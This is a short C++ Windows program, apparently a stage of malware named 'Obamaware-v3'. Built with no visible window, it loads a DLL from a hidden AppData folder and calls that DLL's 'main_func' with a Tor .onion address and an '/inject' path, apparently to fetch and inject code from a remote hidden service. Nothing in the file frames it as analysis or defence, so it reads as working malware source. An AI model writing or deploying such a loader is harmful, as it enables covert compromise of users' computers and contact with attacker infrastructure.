#include <windows.h>

typedef int (WINAPI* MainFuncType)(char*, char*, char*);

//cl /std:c++17 /O2 load_mapper_elevated.cpp /link /SUBSYSTEM:WINDOWS

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    char dllPath[MAX_PATH];
    DWORD len = ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Obamaware-v3\\dependencymanager.dll", dllPath, MAX_PATH);
    if (len == 0 || len > MAX_PATH) {
        return 1;
    }

    HMODULE hMod = LoadLibraryA(dllPath);
    if (!hMod) {
        return 1;
    }

    FARPROC proc = GetProcAddress(hMod, "main_func");
    if (!proc) {
        FreeLibrary(hMod);
        return 1;
    }

    MainFuncType main_func = reinterpret_cast<MainFuncType>(proc);

    int result = main_func(
        "we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion",
        "/inject",
        "main_func"
    );

    FreeLibrary(hMod);
    return result;
}